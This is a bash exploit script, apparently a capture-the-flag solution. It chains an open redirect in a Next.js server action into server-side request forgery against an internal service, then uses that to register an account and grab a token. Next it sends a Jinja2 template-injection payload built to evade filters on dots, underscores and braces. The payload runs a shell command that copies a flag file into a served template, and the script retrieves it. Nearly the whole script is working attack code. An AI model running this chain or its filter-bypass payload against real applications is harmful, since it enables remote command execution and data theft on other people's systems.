#!/bin/bash

HOST='localhost:1337'
HOST='94.237.53.113:51433'
TMP_LOG=$(mktemp)

# kill all background jobs when script exits
trap "trap - SIGTERM && kill -- -$$" SIGINT SIGTERM EXIT

echo + exposing port 8000 to the internet
ssh -R 80:localhost:8000 localhost.run -- --no-inject-http-proxy-headers >$TMP_LOG 2>&1 &
while ! PUBLIC_URL=$(grep 'https://.*life' -o $TMP_LOG) ; do sleep 0.1; done
echo + using $PUBLIC_URL

## function to start attack server that redirects to given URL. Triggered using next_redirect function
function attack_server {
    2>/dev/null ./attack-server.py "$1" &
    attack_server_pid="$!"
    sleep 1
}

## function that causes the next redirect exploit
function next_redirect {
    # Replay the next.js request to trigger the server action that's vulnerable to redirect, giving it our attack server address
    curl -s -X POST "http://${HOST}/" -H "Host: ${PUBLIC_URL#https://}" -H "Origin: ${PUBLIC_URL}" \
        -H 'Next-Action: 0b0da34c9bad83debaebc8b90e4d5ec7544ca862' \
        --form '0=["$K1"]'
}

# setup attacker server that returns a redirect to register a random user just to get token
echo + setting up attack server to register new account using ssrf
creds=$(cat /dev/urandom | tr -cd "a-f0-9" | head -c 5)
attack_server "http://127.0.0.1:3000/register?username=${creds}&password=${creds}"

token=$(next_redirect | grep 'token: [^<]*' -o)
token=${token#token: }
echo + got token: $token

function urlencode {
    python3 -c "import sys,urllib.parse;print(urllib.parse.quote(sys.stdin.read()));"
}

# build our payload to bypass all these filters
# invalid_chars = ["{{", "}}", ".", "_", "[", "]","\\", "x"]
# this payload is amazing and bypasses most things (https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2---filter-bypass)
payload="request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('os')|attr('popen')('cat /flag* >/app/av/application/templates/scan.html')|attr('read')()"
# instead of {{ I've put it inside a for loop using {% and it's still evaluated normally
payload="{%for i in ${payload}%}pwn{%endfor%}"
# we still need to replace _ since it's filtered and we can't use ex:'request.args.underscore' or \x5f  since '.' and 'x' are blocked
# so use a url parameter '_' and then just get it's name and use it to build all underscore variables
payload=$(echo $payload | sed "s/'__\([^_]*\)__'/request|attr('args')|first*2+'\1'+request|attr('args')|first*2/g")
# do the same to replace the .
payload=$(echo $payload | sed "s/\./'+request|attr('args')|last+'/g")
payload=$(echo $payload | urlencode)

kill $attack_server_pid # kill previous attacker server to start a new one
echo + setting attack server redirect to get write flag somewhere else
attack_server "http://127.0.0.1:3000/home?_=pwn&token=${token}&directory=${payload}&.=fuck"

echo + sending ssti request
# note that after this part the attack cannot be replayed since we broke the scan.html page by sending our payload
# so that we can retrieve the flag
next_redirect | grep 'Scanned Directory'

kill $attack_server_pid # kill previous attacker server to start a new one
echo + setting attack server retrieve flag
attack_server "http://127.0.0.1:3000/home?token=${token}&directory=/home"
# perform replay attack again
next_redirect

echo

rm $TMP_LOG

